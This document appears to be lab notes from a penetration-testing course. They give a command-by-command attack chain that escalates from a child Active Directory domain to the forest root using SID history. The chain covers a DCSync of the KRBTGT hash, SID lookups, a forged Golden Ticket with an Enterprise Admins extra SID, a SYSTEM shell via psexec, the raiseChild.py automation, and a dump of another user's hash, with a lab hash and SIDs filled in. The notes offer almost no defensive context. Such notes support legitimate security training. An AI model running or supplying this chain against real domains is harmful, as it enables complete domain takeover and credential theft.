## Checking SIDHistory


```
netexec ldap <DC_IP> -u username -p 'password' -d child.domain.local --query "(sIDHistory=*)" "sAMAccountName sIDHistory"
```


This attack chains **child domain compromise → parent domain takeover** within the same AD forest by abusing the trust relationship and lack of SID filtering between domains in the same forest.

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

Once we have complete control of the child domain, `LOGISTICS.INLANEFREIGHT.LOCAL`, we can use `secretsdump.py` to DCSync and grab the NTLM hash for the KRBTGT account.


## Performing DCSync with secretsdump.py

```ruby
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```


## Performing SID Brute Forcing using lookupsid.py


```ruby
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```


## Grabbing the Domain SID & Attaching to Enterprise Admin's RID

```ruby
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user `hacker` to forge our Golden Ticket.

- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`
- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`
- The name of a target user in the child domain (does not need to exist!): `hacker`
- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

## Constructing a Golden Ticket using ticketer.py


```ruby
impacket-ticketer -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```


### Setting the KRB5CCNAME Environment Variable

```ruby
export KRB5CCNAME=hacker.ccache
```


## Getting a SYSTEM shell using Impacket's psexec.py


```ruby
impacket-psexec LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```


## Performing the Attack with raiseChild.py

This tool will automatically do all these process

```ruby
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```


## Getting user's hash with secretdump

```ruby
secretsdump.py -k -no-pass -just-dc-user bross \
  -target-ip 172.16.5.5 \
  hacker@academy-ea-dc01.inlanefreight.local
```

